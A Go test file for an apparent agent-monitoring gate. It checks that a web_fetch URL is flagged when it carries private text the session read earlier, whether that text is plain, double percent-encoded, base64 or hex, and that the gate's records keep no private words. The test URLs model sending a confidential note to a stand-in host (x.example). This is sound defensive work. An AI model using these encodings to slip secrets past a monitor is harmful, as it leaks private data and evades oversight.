package sentry_test

import (
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/url"
	"strings"
	"testing"

	"github.com/erlidev/eika/internal/sentry"
)

const privateNote = "The quarterly layoff plan names forty people in the Lisbon office and the " +
	"severance budget is nine hundred thousand euros before anyone has been told"

func fetchArgs(u string) json.RawMessage {
	b, _ := json.Marshal(map[string]string{"url": u})
	return b
}

func TestCarriedMarkAfterDecoding(t *testing.T) {
	run, _, _ := strings.Cut(privateNote, "before")
	tests := []struct {
		name, url string
		want      bool
	}{
		{"plain words", "https://x.example/?q=" + url.QueryEscape(run), true},
		{"percent twice", "https://x.example/?q=" + url.QueryEscape(url.QueryEscape(run)), true},
		{"base64", "https://x.example/" + base64.RawURLEncoding.EncodeToString([]byte(run)), true},
		{"base64 after a prefix", "https://x.example/ab" + base64.StdEncoding.EncodeToString([]byte(run)), true},
		{"hex", "https://x.example/" + hex.EncodeToString([]byte(run)), true},
		{"other text", "https://x.example/?q=" + url.QueryEscape("the weather in Lisbon is warm and the office is open all week long"), false},
		{"seven words", "https://x.example/?q=the+quarterly+layoff+plan+names+forty+people", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			marks := &markRecords{}
			g := sentry.New(sentry.Options{Audit: &records{}, Marks: marks})
			g.Observe(t.Context(), sentry.Observation{Kind: sentry.ObservePrivateRead, Session: "s", Text: privateNote})
			act := sentry.Action{Principal: sentry.Principal{Session: "s", Run: "r"}, Kind: sentry.KindTool, Name: "web_fetch", Args: fetchArgs(tt.url)}
			if v, err := g.Decide(t.Context(), act); err != nil || v.Decision != sentry.Allow {
				t.Fatalf("verdict = %+v, %v; a mark must not change it", v, err)
			}
			if got := len(marks.values(sentry.MarkCarried)) == 1; got != tt.want {
				t.Fatalf("carried = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestCarriedIsPerSession(t *testing.T) {
	marks := &markRecords{}
	g := sentry.New(sentry.Options{Audit: &records{}, Marks: marks})
	g.Observe(t.Context(), sentry.Observation{Kind: sentry.ObservePrivateRead, Session: "a", Text: privateNote})
	act := sentry.Action{Principal: sentry.Principal{Session: "b"}, Kind: sentry.KindTool, Name: "web_fetch",
		Args: fetchArgs("https://x.example/?q=" + url.QueryEscape(privateNote))}
	if _, err := g.Decide(t.Context(), act); err != nil {
		t.Fatal(err)
	}
	if len(marks.marks) != 0 {
		t.Fatalf("another session's read marked: %+v", marks.marks)
	}
}

func TestFingerprintsNeverHoldPrivateText(t *testing.T) {
	marks, rec := &markRecords{}, &records{}
	g := sentry.New(sentry.Options{Audit: rec, Marks: marks})
	g.Observe(t.Context(), sentry.Observation{Kind: sentry.ObservePrivateRead, Session: "s", Text: privateNote})
	act := sentry.Action{Principal: sentry.Principal{Session: "s", Run: "r"}, Kind: sentry.KindTool, Name: "web_fetch",
		Args: fetchArgs("https://x.example/?q=" + url.QueryEscape(privateNote))}
	if _, err := g.Decide(t.Context(), act); err != nil {
		t.Fatal(err)
	}
	if len(marks.marks) != 1 {
		t.Fatalf("marks = %+v", marks.marks)
	}
	// Everything the gate holds or wrote, as text: state, marks and audit rows.
	dump := fmt.Sprintf("%+v %+v %+v", g, marks.marks, rec.audit)
	for _, word := range []string{"layoff", "Lisbon", "severance", "euros", "quarterly"} {
		if strings.Contains(strings.ToLower(dump), strings.ToLower(word)) {
			t.Errorf("%q found in the gate's state or records", word)
		}
	}
}
